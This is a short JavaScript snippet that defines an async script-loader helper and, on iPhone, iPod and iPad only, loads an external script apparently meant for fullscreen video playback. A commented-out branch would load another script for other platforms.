var loadScript = function(src, callbackfn) {
    var newScript = document.createElement("script");
    newScript.type = "text/javascript";
    newScript.setAttribute("async", "true");
    newScript.setAttribute("src", src);

    if(newScript.readyState) {
        newScript.onreadystatechange = function() {
            if(/loaded|complete/.test(newScript.readyState)) callbackfn();
        }
    } else {
        newScript.addEventListener("load", callbackfn, false);
    }

    document.documentElement.firstChild.appendChild(newScript);
}


var platform = window.navigator.platform;
var iphoneMachines = ['iPhone','iPod','iPad'];

if(platform === iphoneMachines[0] || platform === iphoneMachines[1] || platform === iphoneMachines[2]) {
    loadScript("https://kissmind-slu.github.io/video-split-fullscreen/index.js", function() { 
        
    });
} 
// else {
//     loadScript("other_lulz.js", function() { 
        
//     });
// }